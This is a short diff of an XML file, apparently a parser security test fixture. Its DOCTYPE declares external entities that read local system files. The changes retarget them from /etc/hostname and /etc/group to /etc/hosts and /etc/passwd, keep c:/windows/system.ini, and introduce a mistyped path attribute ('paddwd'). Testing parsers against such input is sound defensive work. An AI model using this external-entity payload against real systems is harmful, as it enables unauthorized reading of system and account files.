@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xml" href="?#"?>
 <!DOCTYPE div [
-  <!ENTITY passwd SYSTEM "file:///etc/hostname">
+  <!ENTITY passwd SYSTEM "file:///etc/hosts">
   <!ENTITY sysini SYSTEM "file:///c:/windows/system.ini">
- <!ENTITY group SYSTEM "file:///etc/group">
+ <!ENTITY group SYSTEM "file:///etc/passwd">
 ]>
 <div>
-  <p path="file:///etc/hostname">&passwd;</p>
+  <p path="file:///etc/hosts">&passwd;</p>
   <p path="file:///c:/windows/system.ini">&sysini;</p>
-  <p path="file:////etc/group">&group;</p>
+  <p path="file:////etc/paddwd">&group;</p>
 </div>
